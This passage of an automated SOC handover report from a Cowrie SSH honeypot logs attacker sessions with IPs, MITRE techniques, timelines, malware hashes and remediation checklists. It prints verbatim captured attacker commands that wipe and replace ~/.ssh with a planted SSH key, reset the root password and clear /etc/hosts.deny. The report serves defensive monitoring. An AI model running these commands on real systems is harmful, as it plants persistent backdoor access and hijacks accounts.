- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13a12d30b5ca

| Field | Detail |
|---|---|
| **Source IP** | `143.198.161[.]12` |
| **First Seen** | 2026-04-09 08:38 |
| **Last Seen** | 2026-04-09 08:39 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:YIP2kkXDDxBt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:38:45` | `cowrie.session.connect` |
| `2026-04-09 08:38:45` | `cowrie.client.version` |
| `2026-04-09 08:38:45` | `cowrie.client.kex` |
| `2026-04-09 08:38:46` | `cowrie.login.success` |
| `2026-04-09 08:38:47` | `cowrie.session.params` |
| `2026-04-09 08:38:47` | `cowrie.command.input` |
| `2026-04-09 08:38:47` | `cowrie.command.failed` |
| `2026-04-09 08:38:47` | `cowrie.log.closed` |
| `2026-04-09 08:38:47` | `cowrie.session.params` |
| `2026-04-09 08:38:47` | `cowrie.command.input` |
| `2026-04-09 08:38:47` | `cowrie.session.file_download` |
| `2026-04-09 08:38:47` | `cowrie.log.closed` |
| `2026-04-09 08:38:56` | `cowrie.session.params` |
| `2026-04-09 08:38:56` | `cowrie.command.input` |
| `2026-04-09 08:38:56` | `cowrie.log.closed` |
| `2026-04-09 08:38:57` | `cowrie.session.params` |
| `2026-04-09 08:38:57` | `cowrie.command.input` |
| `2026-04-09 08:38:57` | `cowrie.log.closed` |
| `2026-04-09 08:38:58` | `cowrie.session.params` |
| `2026-04-09 08:38:58` | `cowrie.command.input` |
| `2026-04-09 08:38:58` | `cowrie.session.file_download` |
| `2026-04-09 08:38:58` | `cowrie.log.closed` |
| `2026-04-09 08:38:58` | `cowrie.session.params` |
| `2026-04-09 08:38:58` | `cowrie.command.input` |
| `2026-04-09 08:38:58` | `cowrie.log.closed` |
| `2026-04-09 08:38:59` | `cowrie.session.params` |
| `2026-04-09 08:38:59` | `cowrie.command.input` |
| `2026-04-09 08:38:59` | `cowrie.log.closed` |
| `2026-04-09 08:39:00` | `cowrie.session.params` |
| `2026-04-09 08:39:00` | `cowrie.command.input` |
| `2026-04-09 08:39:00` | `cowrie.command.input` |
| `2026-04-09 08:39:00` | `cowrie.log.closed` |
| `2026-04-09 08:39:00` | `cowrie.session.params` |
| `2026-04-09 08:39:00` | `cowrie.command.input` |
| `2026-04-09 08:39:00` | `cowrie.log.closed` |
| `2026-04-09 08:39:01` | `cowrie.session.params` |
| `2026-04-09 08:39:01` | `cowrie.command.input` |
| `2026-04-09 08:39:01` | `cowrie.log.closed` |
| `2026-04-09 08:39:02` | `cowrie.session.params` |
| `2026-04-09 08:39:02` | `cowrie.command.input` |
| `2026-04-09 08:39:02` | `cowrie.log.closed` |
| `2026-04-09 08:39:02` | `cowrie.session.params` |
| `2026-04-09 08:39:02` | `cowrie.command.input` |
| `2026-04-09 08:39:03` | `cowrie.log.closed` |
| `2026-04-09 08:39:03` | `cowrie.session.params` |
| `2026-04-09 08:39:03` | `cowrie.command.input` |
| `2026-04-09 08:39:03` | `cowrie.log.closed` |
| `2026-04-09 08:39:04` | `cowrie.session.params` |
| `2026-04-09 08:39:04` | `cowrie.command.input` |
| `2026-04-09 08:39:04` | `cowrie.log.closed` |
| `2026-04-09 08:39:04` | `cowrie.session.params` |
| `2026-04-09 08:39:04` | `cowrie.command.input` |
| `2026-04-09 08:39:05` | `cowrie.log.closed` |
| `2026-04-09 08:39:05` | `cowrie.session.params` |
| `2026-04-09 08:39:05` | `cowrie.command.input` |
| `2026-04-09 08:39:05` | `cowrie.log.closed` |
| `2026-04-09 08:39:06` | `cowrie.session.params` |
| `2026-04-09 08:39:06` | `cowrie.command.input` |
| `2026-04-09 08:39:06` | `cowrie.log.closed` |
| `2026-04-09 08:39:06` | `cowrie.session.params` |
| `2026-04-09 08:39:06` | `cowrie.command.input` |
| `2026-04-09 08:39:07` | `cowrie.log.closed` |
| `2026-04-09 08:39:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.161[.]12` to AbuseIPDB if not already reported
- [ ] Block `143.198.161[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463fde075e98

| Field | Detail |
|---|---|
| **Source IP** | `124.7.227[.]98` |
| **First Seen** | 2026-04-09 08:44 |
| **Last Seen** | 2026-04-09 08:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:44:54` | `cowrie.session.connect` |
| `2026-04-09 08:44:54` | `cowrie.client.version` |
| `2026-04-09 08:44:54` | `cowrie.client.kex` |
| `2026-04-09 08:44:54` | `cowrie.login.success` |
| `2026-04-09 08:44:55` | `cowrie.session.params` |
| `2026-04-09 08:44:55` | `cowrie.command.input` |
| `2026-04-09 08:44:55` | `cowrie.command.failed` |
| `2026-04-09 08:44:55` | `cowrie.log.closed` |
| `2026-04-09 08:44:55` | `cowrie.session.params` |
| `2026-04-09 08:44:55` | `cowrie.command.input` |
| `2026-04-09 08:44:55` | `cowrie.session.file_download` |
| `2026-04-09 08:44:55` | `cowrie.log.closed` |
| `2026-04-09 08:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.7.227[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.7.227[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce610b77a602

| Field | Detail |
|---|---|
| **Source IP** | `124.7.227[.]98` |
| **First Seen** | 2026-04-09 08:44 |
| **Last Seen** | 2026-04-09 08:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:44:56` | `cowrie.session.connect` |
| `2026-04-09 08:44:56` | `cowrie.client.version` |
| `2026-04-09 08:44:56` | `cowrie.client.kex` |
| `2026-04-09 08:44:56` | `cowrie.login.success` |
| `2026-04-09 08:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.7.227[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.7.227[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea993a06a15a

| Field | Detail |
|---|---|
| **Source IP** | `124.7.227[.]98` |
| **First Seen** | 2026-04-09 08:53 |
| **Last Seen** | 2026-04-09 08:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:53:09` | `cowrie.session.connect` |
| `2026-04-09 08:53:09` | `cowrie.client.version` |
| `2026-04-09 08:53:09` | `cowrie.client.kex` |
| `2026-04-09 08:53:09` | `cowrie.login.success` |
| `2026-04-09 08:53:09` | `cowrie.session.params` |
| `2026-04-09 08:53:09` | `cowrie.command.input` |
| `2026-04-09 08:53:09` | `cowrie.command.failed` |
| `2026-04-09 08:53:10` | `cowrie.log.closed` |
| `2026-04-09 08:53:10` | `cowrie.session.params` |
| `2026-04-09 08:53:10` | `cowrie.command.input` |
| `2026-04-09 08:53:10` | `cowrie.session.file_download` |
| `2026-04-09 08:53:10` | `cowrie.log.closed` |
| `2026-04-09 08:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.7.227[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.7.227[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-439d4409b9a7

| Field | Detail |
|---|---|
| **Source IP** | `124.7.227[.]98` |
| **First Seen** | 2026-04-09 08:53 |
| **Last Seen** | 2026-04-09 08:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:53:11` | `cowrie.session.connect` |
| `2026-04-09 08:53:11` | `cowrie.client.version` |
| `2026-04-09 08:53:11` | `cowrie.client.kex` |
| `2026-04-09 08:53:11` | `cowrie.login.success` |
| `2026-04-09 08:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.7.227[.]98` to AbuseIPDB if not already reported
- [ ] Block `124.7.227[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff59d87f7d8

| Field | Detail |
|---|---|
| **Source IP** | `143.198.161[.]12` |
| **First Seen** | 2026-04-09 08:54 |
| **Last Seen** | 2026-04-09 08:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:54:33` | `cowrie.session.connect` |
| `2026-04-09 08:54:33` | `cowrie.client.version` |
| `2026-04-09 08:54:34` | `cowrie.client.kex` |
| `2026-04-09 08:54:34` | `cowrie.login.success` |
| `2026-04-09 08:54:35` | `cowrie.session.params` |
| `2026-04-09 08:54:35` | `cowrie.command.input` |
| `2026-04-09 08:54:35` | `cowrie.command.failed` |
| `2026-04-09 08:54:35` | `cowrie.log.closed` |
| `2026-04-09 08:54:36` | `cowrie.session.params` |
| `2026-04-09 08:54:36` | `cowrie.command.input` |
| `2026-04-09 08:54:36` | `cowrie.session.file_download` |
| `2026-04-09 08:54:36` | `cowrie.log.closed` |
| `2026-04-09 08:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.161[.]12` to AbuseIPDB if not already reported
- [ ] Block `143.198.161[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d70926283e

| Field | Detail |
|---|---|
| **Source IP** | `143.198.161[.]12` |
| **First Seen** | 2026-04-09 08:54 |
| **Last Seen** | 2026-04-09 08:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-09 08:54:38` | `cowrie.session.connect` |
| `2026-04-09 08:54:38` | `cowrie.client.version` |
| `2026-04-09 08:54:39` | `cowrie.client.kex` |
| `2026-04-09 08:54:40` | `cowrie.login.success` |
| `2026-04-09 08:54:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.198.161[.]12` to AbuseIPDB if not already reported
- [ ] Block `143.198.161[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.244.25[.]6` | **24** | 2026-04-09 08:29 | 2026-04-09 08:38 | 22m | 8 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `124.7.227[.]98` | **13** | 2026-04-09 08:27 | 2026-04-09 09:02 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `117.245.138[.]241` | **9** | 2026-04-09 08:15 | 2026-04-09 08:17 | 1m | 0 | `T1592` | 🟢 LOW |
| `143.198.161[.]12` | **8** | 2026-04-09 08:31 | 2026-04-09 09:01 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.125[.]174` | **2** | 2026-04-09 07:44 | 2026-04-09 07:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `203.2.164[.]205` | **2** | 2026-04-09 08:27 | 2026-04-09 08:29 | 4m | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]167` | 1 | 2026-04-09 08:32 | 2026-04-09 08:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.25.208[.]110` | 1 | 2026-04-09 07:19 | 2026-04-09 07:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.214.181[.]197` | 1 | 2026-04-09 08:56 | 2026-04-09 08:56 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `143.198.161[.]12` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `124.7.227[.]98` | IN | Sify Limited | **100** ⚠️ | 50 |
| `203.2.164[.]205` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `221.214.181[.]197` | CN | China Unicom Shandong province network | **100** ⚠️ | 50 |
| `14.103.118[.]167` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `203.25.208[.]110` | CN | CHINANET Guangdong province network | **100** ⚠️ | 50 |
| `135.237.125[.]174` | US | Microsoft Limited | **100** ⚠️ | 0 |
| `223.244.25[.]6` | CN | CHINANET Anhui province network | **100** ⚠️ | 50 |
| `117.245.138[.]241` | IN | BSNL GSM North Zone, O/o Sr GM (CMTS), NC, Chandigarh | **84** ⚠️ | 4 |
| `145.132.103[.]179` | US | Microsoft Limited | **30** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 65 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 29 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 15 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |

---

## 🔕 False Positive Summary (2 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 78 cases |
| Tool 34  | Credential Extractor        | ✅ 44 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 11 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2 filtered (2.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 15 priority case(s) shown individually · 9 recon entry/entries in table (6 group(s) consolidating 58 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-09T09:05:32Z_
